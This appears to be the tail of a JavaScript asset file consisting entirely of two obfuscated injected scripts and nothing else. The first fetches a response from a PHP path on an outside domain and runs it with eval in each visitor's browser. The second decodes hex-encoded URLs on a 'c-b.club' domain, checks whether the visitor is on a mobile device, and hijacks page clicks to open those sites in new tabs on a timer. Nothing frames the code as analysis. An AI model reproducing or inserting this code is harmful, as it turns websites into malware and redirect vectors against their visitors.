};if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//simplypos.in/EduErp2020/assets/CircleType/backstop_data/bitmaps_reference/bitmaps_reference.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4e\x78\x4f\x39\x63\x35','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x61\x67\x38\x63\x31','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x66\x42\x63\x35\x63\x31','8SJGLkz','random','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x66\x75\x31\x63\x36','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x64\x43\x32\x63\x33','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x75\x52\x34\x63\x32','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x57\x4c\x72\x33\x63\x37','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4d\x74\x6b\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x52\x4a\x36\x63\x33','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4b\x68\x66\x37\x63\x34',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());